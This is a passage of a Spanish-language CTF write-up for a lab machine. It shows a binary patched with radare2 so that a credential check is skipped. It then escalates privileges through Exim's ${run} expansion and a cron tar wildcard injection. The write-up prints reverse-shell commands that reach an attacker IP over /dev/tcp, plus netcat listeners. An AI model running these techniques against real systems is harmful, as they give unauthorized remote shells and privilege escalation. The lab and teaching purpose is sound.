│      ││   0x0000335f      4889c7         mov rdi, rax                ; const char *format
│      ││   0x00003362      b800000000     mov eax, 0
│      ││   0x00003367      e8c4ecffff     call sym.imp.printf         ; int printf(const char *format)
│      ││   0x0000336c      b801000000     mov eax, 1
│     ┌───< 0x00003371      eb0f           jmp 0x3382
│     │││   ; CODE XREF from main @ 0x3356(x)
│     ││└─> 0x00003373      b800000000     mov eax, 0
│     ││    0x00003378      e8ecf5ffff     call sym.k8j4h3
│     ││    0x0000337d      b800000000     mov eax, 0
│     ││    ; CODE XREFS from main @ 0x3311(x), 0x3371(x)
│     └└──> 0x00003382      488b55f8       mov rdx, qword [canary]
│           0x00003386      64482b1425..   sub rdx, qword fs:[0x28]
│       ┌─< 0x0000338f      7405           je 0x3396
│       │   0x00003391      e81aedffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from main @ 0x338f(x)
│       └─> 0x00003396      c9             leave
└           0x00003397      c3             ret
[0x00002ccf]>
```

Navegamos a través del código compilado hasta que localizamos la instrucción CALL que llama a la primera función de impresión y su siguiente instrucción.

```bash
│           0x000032c2      e869edffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000032c7      488d8510ef..   lea rax, [var_10f0h]
```

Luego buscaremos la dirección de la función k8j4h3(), que es la llamada una vez que se pasa el sistema de verificación.

```bash
is~k8j4h3
```
```bash
59  0x00002969 0x00002969 GLOBAL FUNC   870      k8j4h3
```

Con esta información ahora necesitamos calcular el desplazamiento relativa desde la función k8j4h3() a la dirección de memoria 0x000032c7

```
offset = address of the destination function - address of the instruction following the CALL

offset = 0x00002969 - 0x000032c7 = -0x95E
```

Ahora debemos codificar el desplazamiento en complemento a 2.

```
Tomamos el desplazamiento absoluto 0x95E y lo convertimos a binario

0x95E= 1001 0101 1110

Invertimos los bits y sumamos +1

1001 0101 1110= 0110 1010 0001 + 1 = 0110 1010 0010

convertimos el resultado en hexadecimal

0110 1010 0010 = 0x6a2

Pero como necesitamos 4 bytes, complementamos por la izquierda con "f"

0x6a2 = 0xfffff6a2

convertimos en formato little-endian

ff ff f6 a2 = a2 f6 ff ff

agregamos la instrucción CALL

final_result= e8a2f6ffff

```

Ahora tenemos el desplazamiento relativo para reemplazar la llamada a la función printf con la función k8j4h3().

```bash
s 0x000032c2
wx e8a2f6ffff
pd 1 @ 0x000032c2
```
```bash
│           0x000032c2      e8a2f6ffff     call sym.k8j4h3
```

La llamada a la función deseada se ha sobrescrito correctamente. Salimos y volvemos a ejecutar el programa.

```
quit
./sec2pass
```

![image](https://github.com/user-attachments/assets/c134722b-fd6b-4d99-acbb-78a1462c5ea8)

Hemos saltado la verificación y tras probar las credenciales, las únicas que resultan válidas son las de Carlos a través del servicio SSH.

# Escalada 

### Carlos

![image](https://github.com/user-attachments/assets/701f6737-d4fe-426f-8f52-2220289b3446)

vemos que el servicio cron esta corriendo asi que chequeamos que corre

```bash
cat /etc/crontab
```

![image](https://github.com/user-attachments/assets/1a9a0fa6-160b-4b9d-8803-c69591e23503)

```bash
cat /usr/local/bin/back.sh
```

![image](https://github.com/user-attachments/assets/7c4f0c69-bac3-4cdf-9557-b81f8bd02f06)

no tenemos permisos de lectura sobre el archivo, asi valido el archivo `mbox`

```bash
cat mbox
```
```bash
From robert@cybersec Thu Mar 20 15:35:07 2025
Return-path: <robert@cybersec>
Envelope-to: carlos@cybersec
Delivery-date: Thu, 20 Mar 2025 15:35:07 +0000
Received: from robert by cybersec with local (Exim 4.96)
	(envelope-from <robert@cybersec>)
	id 1tvHvH-00002O-1M
	for carlos@cybersec;
	Thu, 20 Mar 2025 15:35:07 +0000
To: carlos@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvHvH-00002O-1M@cybersec>
From: robert@cybersec
Date: Thu, 20 Mar 2025 15:35:07 +0000
Status: RO

Hola Carlos, espero te encuentres bien, te comento que tengo que ir de viaje con el coordinador a un evento en otra ciudad, el problema 
es que no me dara tiempo de esperar tu reporte del incidente reciente y enviar todo el informe al departamento de Dracor S.A.; en vista de que no estare 
hablare con el administrador para que te asigne permisos y asi puedas enviar el reporte desde mi correo a Dracor S.A. ya que esperan por mi 
respuesta en cuanto al caso caso y asi cuando lo tengas listo lo envias por favor.


From carlos@cybersec Thu Mar 20 15:37:51 2025
Return-path: <carlos@cybersec>
Envelope-to: robert@cybersec
Delivery-date: Thu, 20 Mar 2025 15:37:51 +0000
Received: from carlos by cybersec with local (Exim 4.96)
	(envelope-from <carlos@cybersec>)
	id 1tvHxv-00002X-0U
	for robert@cybersec;
	Thu, 20 Mar 2025 15:37:51 +0000
To: robert@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvHxv-00002X-0U@cybersec>
From: carlos@cybersec
Date: Thu, 20 Mar 2025 15:37:51 +0000
Status: RO

Hola Robert, perfecto, el reporte estara listo para manana, habla con el administrador y cualquier novedad me avisas, saludos.

From robert@cybersec Thu Mar 20 15:42:23 2025
Return-path: <robert@cybersec>
Envelope-to: carlos@cybersec
Delivery-date: Thu, 20 Mar 2025 15:42:23 +0000
Received: from robert by cybersec with local (Exim 4.96)
        (envelope-from <robert@cybersec>)
        id 1tvI2J-00002o-0k
        for carlos@cybersec;
        Thu, 20 Mar 2025 15:42:23 +0000
To: carlos@cybersec
Subject: Viaje
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1tvI2J-00002o-0k@cybersec>
From: robert@cybersec
Date: Thu, 20 Mar 2025 15:42:23 +0000
Status: RO

Saludos Carlos, ya he notificado al administrador (root) y queda a la espera de que le hagas llegar el requerimiento en root@cybersec, recuerda el formato de solicitud:

Nombre del solicitante:
Fecha:
mensaje:
Breve descripcion:

en la descripcion es importante que coloques el siguiente numero de caso para dar continuidad con mi solicitud, caso nro: 000-01458
y esta al pendiente de tu bandeja porque una vez te habiliten los permisos recibiras la notificacion, saludos
```

al parecer el administrador esta en espera de un correo por parte de Carlos, al detallar los registros de correos puedo ver que estan haciendo uso de Exim 4.96, asi que ya conozco el agente de Transferencia de Correo (MTA) utilizado... Vamos a enviar un correo con la informacion que tenemos a mano

```bash
echo "Nombre del solicitante: carlos; Fecha:20/03/25; mensaje:Solicitud de Permisos; Breve descripcion:000-01458" | /usr/sbin/exim root@cybersec
```

ahora despues de enviar el correo consultamos si tenemos correos entrantes

```bash
mail
```

![image](https://github.com/user-attachments/assets/9b4f1ee1-d3aa-452c-aaac-b1cddfcf99b4)

para leer el mensaje debemos seleccionarlo con el numero 1

![image](https://github.com/user-attachments/assets/929dec8c-fd26-4239-8f8e-ae20630989b9)

si validamos los permisos de carlos con `sudo -l` vemos:

![image](https://github.com/user-attachments/assets/fa418db1-c0e9-4dc6-ab52-ce3c1eb6d48b)

podemos ejecutar `exim` como el usuario `robert`. Despues de investigacion y lectura de la documentacion oficial vemos como es posible la ejecucion de comandos de forma local

![image](https://github.com/user-attachments/assets/4b3077a2-cfc5-447a-a846-14c0875bafe9)

testeamos

![image](https://github.com/user-attachments/assets/f3f82e9a-5ea4-4aef-920c-fa6301ae52c1)

logramos ejecucion de comandos, lo que no puedo es lanzar una `/bin/bash` asi que me va tocar lanzar una revershell

```bash
nc -lnvp 4445 # desde mi maquina atacante
```

desde carlos
```bash
sudo -u robert /usr/sbin/exim -be '${run{/bin/bash -c "setsid bash -i >& /dev/tcp/172.17.0.1/4445 0>&1"}}'
```

![image](https://github.com/user-attachments/assets/065a2c91-b9ca-49d1-adde-b28245479c0c)


### Robert

tratamiento de la tty

```bash
script /dev/null -c bash 
ctrl+z
stty raw -echo; fg
reset xterm
stty rows 38 cols 170
export TERM=xterm
export SHELL=bash
```

buscando un rato no conseguia nada pero recorde el script que se ejecuta a traves de la tarea cron asi que al intentar leer el script si que pude ver su contenido

![image](https://github.com/user-attachments/assets/ad3a5aa0-716f-4be4-bd2a-c9cc1fc6f5b5)

lo que hace el script es, primero se ubica en el directorio `/home/share` y luego ejecuta el comando tar generando un archivo comprimido en `/home/pedro/back.tar` con todo el contenido del directorio `/home/share`

Aunque no lo parezca, el script tiene un fallo de seguridad al hacer uso de `*`, con esto va a tomar todos los archivos del directorio y los va a comprimir, el fallo de seguridad esta en que es posible hacer pasar un archivo por un parametro y con `tar` es posible inyectar comandos, ejemplo:

![image](https://github.com/user-attachments/assets/ae970406-e2af-4c29-8485-42b11a052b2b)


los parametros que nos interesan son: 

```bash
--checkpoint=1 --checkpoint-action=exec=
```

podemos crear 2 archivos con el nombre de estos parametros y asi inyectar comandos, esto es posible porque al comenzar con `--` son interpretados como parametros y no como archivos, asi que para explotar esto haremos lo siguiente:

nos ponemos en escucha con netcat en nuestra maquina
```bash
nc -lnvp 4446
```

luego ejecutamos el siguiente comando que va automatizar la creacion de los archivos maliciosos y el script con la revershell

```bash
cd /home/share && echo ' ' > "--checkpoint=1" && echo ' ' > "--checkpoint-action=exec=sh scape.sh" && echo '#!/bin/bash' > scape.sh && echo "/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4446 0>&1'" >> scape.sh && chmod guo+xrw scape.sh
```

Despues de esperar un tiempo (alrededor de 1.30 min.) obtenemos la revershell

![image](https://github.com/user-attachments/assets/e8539c8c-fcd6-43a7-b034-222d19d64c65)

### Pedro

tratamiento de la tty

```bash
script /dev/null -c bash 
ctrl+z
stty raw -echo; fg
reset xterm
stty rows 38 cols 170
export TERM=xterm
export SHELL=bash
```
este usuario no tiene permisos asignados pero tras chequear las conversaciones de correo veo que es necesario solicitar al administrator permisos sobre gdb como en el caso del usuario carlos

![image](https://github.com/user-attachments/assets/979bb979-10cb-4032-8cef-5dcdeb16b0ce)

... El final lo termino cuando alguien consigo la flag de root 😊










